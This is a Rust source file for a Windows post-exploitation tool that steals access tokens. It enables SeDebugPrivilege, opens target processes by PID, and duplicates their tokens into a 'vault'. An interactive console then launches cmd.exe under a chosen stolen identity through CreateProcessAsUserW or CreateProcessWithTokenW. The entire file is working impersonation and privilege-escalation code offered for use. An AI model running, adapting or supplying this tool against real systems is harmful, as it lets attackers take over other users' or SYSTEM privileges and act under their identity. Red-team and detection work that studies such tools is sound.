use ntapi::ntrtl::RtlAdjustPrivilege;
use std::{ffi::OsStr, io::Write, os::windows::prelude::OsStrExt, process, ptr::null_mut};
use winapi::{
    ctypes::c_void,
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        processthreadsapi::{OpenProcess, OpenProcessToken},
        winnt::{HANDLE, PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE, TOKEN_QUERY},
    },
};
use winapi::{
    shared::minwindef::FALSE,
    um::{
        minwinbase::SECURITY_ATTRIBUTES,
        securitybaseapi::{DuplicateTokenEx, GetTokenInformation},
        winbase::LookupAccountSidA,
        winnt::{
            SecurityImpersonation, TokenPrimary, TokenUser, PSID, SID_NAME_USE,
            TOKEN_ADJUST_DEFAULT, TOKEN_ADJUST_SESSIONID, TOKEN_ASSIGN_PRIMARY, TOKEN_USER,
        },
    },
};
use winapi::{
    shared::minwindef::{MAX_PATH, TRUE},
    um::{
        processthreadsapi::{CreateProcessAsUserW, PROCESS_INFORMATION, STARTUPINFOW},
        securitybaseapi::RevertToSelf,
        synchapi::WaitForSingleObject,
        sysinfoapi::GetSystemDirectoryW,
        userenv::CreateEnvironmentBlock,
        winbase::{
            CreateProcessWithTokenW, CREATE_UNICODE_ENVIRONMENT, INFINITE, LOGON_WITH_PROFILE,
        },
    },
};
#[derive(Debug)]
struct VaultItem {
    token: HANDLE,
    pid: u32,
    username: String,
    domain: String,
}

struct Vaults(Vec<VaultItem>);

fn vault_create(nums: usize) -> Vaults {
    Vaults(Vec::<VaultItem>::with_capacity(nums))
}

impl Drop for VaultItem {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.token);
        }
    }
}

impl VaultItem {
    fn get_username_domain(&mut self) {
        let mut dw_len = 0;
        // Get the size for the process token information
        unsafe { GetTokenInformation(self.token, TokenUser, std::ptr::null_mut(), 0, &mut dw_len) };
        let mut buffer: Vec<u8> = vec![0; dw_len as usize];

        // Get the token information
        if unsafe {
            GetTokenInformation(
                self.token,
                TokenUser,
                buffer.as_mut_ptr() as *mut c_void,
                dw_len,
                &mut dw_len,
            )
        } == 0
        {
            println!("[-]GetTokenInformation Failed:0x{:X}", unsafe {
                GetLastError()
            });
            return;
        }
        let token_user: &TOKEN_USER = unsafe { &*buffer.as_ptr().cast() };
        // Grab the SID from the token
        let user_sid: PSID = token_user.User.Sid;
        let mut sid_type: SID_NAME_USE = Default::default();

        let mut lp_name = [0i8; MAX_PATH];
        let mut lp_domain = [0i8; MAX_PATH];

        // Lookup the SID
        if unsafe {
            LookupAccountSidA(
                std::ptr::null(),
                user_sid,
                lp_name.as_mut_ptr(),
                &mut dw_len,
                lp_domain.as_mut_ptr(),
                &mut dw_len,
                &mut sid_type,
            )
        } == FALSE
        {
            println!("[-]LookupAccountSidA Failed:0x{:X}", unsafe {
                GetLastError()
            });
            return;
        }
        // Get the owner name and domain of the process
        let name = unsafe {
            std::ffi::CStr::from_ptr(lp_name.as_ptr())
                .to_string_lossy()
                .to_string()
        };
        let domain = unsafe {
            std::ffi::CStr::from_ptr(lp_domain.as_ptr())
                .to_string_lossy()
                .to_string()
        };
        self.domain = domain;
        self.username = name;
    }

    unsafe fn start_cmd(&self) {
        let creation_flags = CREATE_UNICODE_ENVIRONMENT;
        let mut lp_environment = null_mut();
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.lpDesktop = to_wchar("WinSta0\\default").as_mut_ptr();

        if CreateEnvironmentBlock(&mut lp_environment, self.token, FALSE) != TRUE {
            println!("[-]CreateEnvironmentBlock Failed:0x{:X}", GetLastError());
        }
        let mut sys_directory = [0u16; MAX_PATH];
        GetSystemDirectoryW(sys_directory.as_mut_ptr(), MAX_PATH as u32);
        if CreateProcessAsUserW(
            self.token,
            to_wchar("C:\\Windows\\System32\\cmd.exe").as_mut_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
            TRUE,
            creation_flags,
            lp_environment,
            sys_directory.as_mut_ptr(),
            &mut si as *mut _ as _,
            &mut pi as *mut _ as _,
        ) == TRUE
        {
            println!("[+]CreateProcessAsUser Success:0x{:X}", GetLastError());
            std::io::stdout().flush().unwrap();
            WaitForSingleObject(pi.hProcess, INFINITE);
        } else {
            println!("\\[-]CreateProcessAsUser Failed:0x{:X}", GetLastError());
            RevertToSelf();
            if CreateProcessWithTokenW(
                self.token,
                LOGON_WITH_PROFILE,
                null_mut(),
                to_wchar("C:\\Windows\\System32\\cmd.exe").as_mut_ptr(),
                creation_flags,
                lp_environment,
                sys_directory.as_mut_ptr(),
                &mut si as *mut _ as _,
                &mut pi as *mut _ as _,
            ) == TRUE
            {
                println!("\\--[+]CreateProcessWithTokenW Success");
                RevertToSelf();
                return;
            } else {
                println!(
                    "\\--[-]CreateProcessWithTokenW Failed:0x{:X}",
                    GetLastError()
                );
                return;
            }
        }
    }
}

impl Vaults {
    fn show(&self) {
        let mut i = 0;
        if self.0.is_empty() {
            println!("[-]empty");
        } else {
            for v in &self.0 {
                i += 1;
                let output = format!(
                    "[+]index:{} pid {} user:{}\\{}",
                    i, v.pid, v.domain, v.username
                );
                println!("{}", output);
            }
        }
    }

    unsafe fn steal_token(&self, pid: u32, handle: *mut HANDLE) -> bool {
        let hprocess: HANDLE = OpenProcess(PROCESS_QUERY_INFORMATION, 1, pid);
        if hprocess.is_null() {
            println!("[-] OpenProcess Failed:0x{:X}", GetLastError());
            return false;
        }
        let mut htoken: HANDLE = null_mut();
        let res = OpenProcessToken(hprocess, TOKEN_QUERY | TOKEN_DUPLICATE, &mut htoken);
        if res == 0 {
            CloseHandle(hprocess);
            println!("[-]OpenProcessToken Failed:0x{:X}", GetLastError());
            return false;
        }
        let res = DuplicateTokenEx(
            htoken,
            TOKEN_ADJUST_DEFAULT
                | TOKEN_ADJUST_SESSIONID
                | TOKEN_QUERY
                | TOKEN_DUPLICATE
                | TOKEN_ASSIGN_PRIMARY,
            null_mut() as *mut SECURITY_ATTRIBUTES,
            SecurityImpersonation,
            TokenPrimary,
            handle,
        );
        CloseHandle(hprocess);
        res != 0
    }

    unsafe fn action_steal_token(&mut self, pid: u32) {
        let mut token: HANDLE = null_mut();
        if self.steal_token(pid, &mut token) {
            let mut item = VaultItem {
                token,
                pid,
                domain: String::new(),
                username: String::new(),
            };
            item.get_username_domain();
            self.0.push(item);
            println!("[*]steal_token pid:{} success", pid);
        }
    }
}

fn usage() {
    println!(
        "Available Commands:
    Steal and store tokens:             steal <comma separated list of PIDs>
    Use the stored token:               use <token-index>
    Show the stored tokens:             show
    Remove the stored token:            remove <token-index>
    Use the specific token to execute:  cmd
    "
    );
}
fn set_se_debug_privilege() {
    unsafe {
        let privilege: u32 = 20;
        let enable: u8 = 1;
        let current_thread: u8 = 0;
        let enabled: *mut u8 = std::mem::transmute(&u8::default());
        let status = RtlAdjustPrivilege(privilege, enable, current_thread, enabled);
        if status != 0 {
            println!("{}", ("[-] SeDebugPrivilege Failed."));
            process::exit(0);
        } else {
            println!("{}", ("[+] SeDebugPrivilege Enabled."));
        }
    }
}

const TOKENNUMBER: i32 = 200;
fn to_wchar(str: &str) -> Vec<u16> {
    OsStr::new(str)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect()
}
fn main() {
    set_se_debug_privilege();
    let mut vaults: Vaults = vault_create(TOKENNUMBER as usize);
    println!("token vault created: 0x{:X}", vaults.0.as_ptr() as usize);
    usage();
    let mut current_index: u32 = 0;
    loop {
        let mut arguments = String::new();
        std::io::stdin().read_line(&mut arguments).unwrap();
        let arguments: Vec<&str> = arguments.split(" ").collect();
        let action = arguments[0].trim();
        if action == "steal" {
            let pids: Vec<&str> = arguments[1].split(",").collect();
            for pid in pids {
                let pid = pid.trim().parse::<u32>().unwrap_or(0);
                if pid != 0 {
                    unsafe { vaults.action_steal_token(pid) };
                    continue;
                } else {
                    println!("[-]PID is illegal");
                    return;
                }
            }
        } else if action == "show" {
            vaults.show();
        } else if action == "exit" {
            println!("[*]Exit!");
            break;
        } else if action == "use" {
            let index = arguments[1].trim().parse::<u32>().unwrap() - 1;
            current_index = if index < vaults.0.len() as u32 {
                println!("[+] Use Token Pid:{:?}", vaults.0[index as usize].pid);
                index
            } else {
                0
            }
        } else if action == "cmd" {
            if vaults.0.is_empty() {
                println!("[-]No token in store");
            } else {
                unsafe { vaults.0[current_index as usize].start_cmd() };
            }
        } else if action == "remove" {
            let index = arguments[1].trim().parse::<u32>().unwrap() - 1;
            if index < vaults.0.len() as u32 {
                vaults.0.remove(index as usize);
            }
        } else {
            usage();
        }
    }
}
